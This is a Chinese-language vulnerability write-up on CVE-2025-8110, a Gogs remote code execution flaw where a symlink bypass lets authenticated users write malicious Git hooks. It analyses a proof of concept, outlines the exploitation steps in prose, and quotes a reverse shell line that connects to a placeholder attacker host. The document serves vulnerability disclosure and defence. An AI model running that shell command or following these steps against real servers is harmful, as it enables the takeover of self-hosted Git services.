## CVE-2025-8110 - Gogs 远程代码执行 (RCE), 命令注入, 符号链接绕过, 任意文件写入

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (RCE), 命令注入, 符号链接绕过, 任意文件写入

**影响应用:** Gogs

**危害等级:** 严重

**CVSS评分:** 8.7 / CVSS 4.0

**影响版本:** Gogs versions prior to 0.13.0

**利用条件:** 需要认证, 需要推送权限, 依赖Git Hook机制

**POC 可用性:** 7/10

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

CVE-2025-8110是一个影响Gogs自托管Git服务的严重远程代码执行（RCE）漏洞。该漏洞的根源在于Gogs在处理Git仓库文件操作（特别是文件上传和在线编辑功能）时存在逻辑缺陷，特别是PutContents API对符号链接（Symbolic Link）的处理不当。这使得攻击者能够绕过先前CVE-2024-55947的安全修复，通过构造包含恶意符号链接的仓库，欺骗Gogs服务器将文件内容写入到仓库目录之外的任意位置。通过覆盖系统关键文件（如SSH密钥文件）或更常见的，写入恶意的Git钩子（Hooks）脚本（例如`post-receive`），攻击者可以在目标服务器上以Gogs进程的权限执行任意代码。此漏洞已在野外被积极利用，造成超过700个公网暴露的Gogs实例遭到攻陷，凸显其高危性。CVSS 4.0评分为8.7分，表明其潜在影响极其严重。

**POC有效性分析与利用步骤：**
提供的POC代码由一个Python脚本`exploit.py`和两个Bash脚本`README.md`（作为说明）及`bash.sh`组成。`exploit.py`的核心功能是模拟在本地创建一个恶意Git仓库结构，并在其`.git/hooks/`目录下写入一个名为`post-receive`的恶意Bash脚本。此脚本包含远程代码执行的payload，例如`id > /tmp/gogs_exploited`或反向shell命令`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`。

POC的有效性在于它清晰地演示了攻击的核心机制：通过某种手段（此处POC模拟了直接写入，实际漏洞利用会结合符号链接绕过）在Gogs服务器上创建或修改Git钩子。当Git服务器接收到一次`git push`操作时，如果相应的`post-receive`钩子存在且被配置执行，那么其中的恶意命令就会在服务器上被执行。
实际的漏洞利用步骤如下：
1.  **认证与权限获取**：攻击者首先需要获得一个Gogs实例上的认证账户，并对至少一个仓库拥有推送（push）权限。
2.  **符号链接绕过**：攻击者利用CVE-2025-8110中描述的符号链接处理缺陷，构造特定的文件操作请求（如上传文件、在线编辑），以欺骗Gogs服务器将恶意内容写入到期望的目标路径。这里的目标路径可以是`./git/hooks/post-receive`或其他可控且能导致代码执行的路径。
3.  **写入恶意Git钩子**：通过上述绕过机制，攻击者成功在Gogs服务器的Git仓库目录或其他可写目录中创建一个恶意的`post-receive`（或其他相关）Git钩子脚本。此钩子脚本中包含攻击者预设的任意命令，例如反向Shell命令或执行系统命令的Payload。
4.  **触发执行**：攻击者向包含恶意钩子的仓库执行一次`git push`操作。Gogs服务器在处理完推送后，会自动执行`post-receive`钩子。此时，钩子中的恶意命令便会在Gogs服务器上以Gogs服务运行的权限被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码是用于防御性安全研究的，其本身并不包含任何恶意投毒行为。`exploit.py`脚本仅用于本地模拟创建包含恶意钩子的Git仓库结构，其代码逻辑清晰，没有混淆、未知的外部引用或可疑的网络请求。`bash.sh`和`post-receive`钩子内容是攻击者在成功利用漏洞后希望在目标系统上执行的“payload”，如反向shell或命令执行，这是漏洞利用的直接效果，而非POC代码本身的“投毒”。这些payload明确指示了攻击者的意图，并可被安全分析人员识别。因此，此POC代码的投毒风险为**0%**。在实际使用该POC进行测试时，研究人员应确保目标环境受控，并知晓执行钩子内容可能带来的系统影响。该POC的设计目标是清晰地展示漏洞的工作原理，而非隐蔽地植入后门。

**项目地址:** 

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8110
